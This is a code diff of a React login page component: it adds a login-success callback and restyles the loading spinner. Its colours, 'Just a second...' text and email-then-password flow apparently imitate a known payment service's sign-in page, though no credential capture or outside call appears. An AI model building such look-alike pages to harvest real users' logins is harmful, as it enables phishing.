@@ -1,14 +1,24 @@
-import React, { useEffect, useState } from 'react';
-export function LoginPage() {
+import { useEffect, useState } from 'react';
+interface LoginPageProps {
+  onLoginSuccess: (email: string) => void;
+}
+
+export function LoginPage({ onLoginSuccess }: LoginPageProps) {
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
   const [step, setStep] = useState<'email' | 'loading' | 'password'>('email');
+
   const handleNext = () => {
     if (email.trim()) {
       setStep('loading');
     }
   };
+
+  const handleLogin = () => {
+    onLoginSuccess(email);
+  };
+
   const handleChange = () => {
     setStep('email');
     setPassword('');
@@ -24,37 +34,20 @@ export function LoginPage() {
   return (
     <div className="relative min-h-screen w-full bg-[#f5f7fa] flex flex-col items-center justify-between font-['Inter',sans-serif]">
       {/* Loading Overlay */}
-      {step === 'loading' &&
-      <div className="absolute inset-0 z-50 bg-white/70 flex items-center justify-center">
-          <svg
-          className="animate-spin"
-          width="56"
-          height="56"
-          viewBox="0 0 56 56"
-          fill="none"
-          xmlns="http://www.w3.org/2000/svg"
-          style={{
-            animationDuration: '0.9s'
-          }}>
-          
-            <circle
-            cx="28"
-            cy="28"
-            r="24"
-            stroke="#E5E7EB"
-            strokeWidth="3"
-            fill="none" />
-          
-            <path
-            d="M52 28a24 24 0 0 0-24-24"
-            stroke="#003087"
-            strokeWidth="3"
-            strokeLinecap="round"
-            fill="none" />
-          
-          </svg>
+      {step === 'loading' && (
+        <div className="absolute inset-0 z-50 bg-white flex flex-col items-center justify-center">
+          <div className="flex flex-col items-center gap-4">
+            <div className="relative w-12 h-12">
+              <div className="absolute inset-0 border-2 border-gray-100 rounded-full"></div>
+              <div 
+                className="absolute inset-0 border-2 border-t-[#0070BA] border-r-transparent border-b-transparent border-l-transparent rounded-full animate-spin"
+                style={{ animationDuration: '0.8s' }}
+              ></div>
+            </div>
+            <p className="text-[#2C2E2F] text-[18px] font-normal">Just a second...</p>
+          </div>
         </div>
-      }
+      )}
 
       {/* Main Card */}
       <div className="flex-1 flex items-center justify-center w-full px-4 py-12">
@@ -149,7 +142,10 @@ export function LoginPage() {
               </div>
 
               {/* Log In Button */}
-              <button className="w-full py-3.5 bg-[#0070BA] hover:bg-[#005EA6] text-white font-bold text-base rounded-full transition-colors mb-6">
+              <button 
+                onClick={handleLogin}
+                className="w-full py-3.5 bg-[#0070BA] hover:bg-[#005EA6] text-white font-bold text-base rounded-full transition-colors mb-6"
+              >
                 Log In
               </button>
             </>
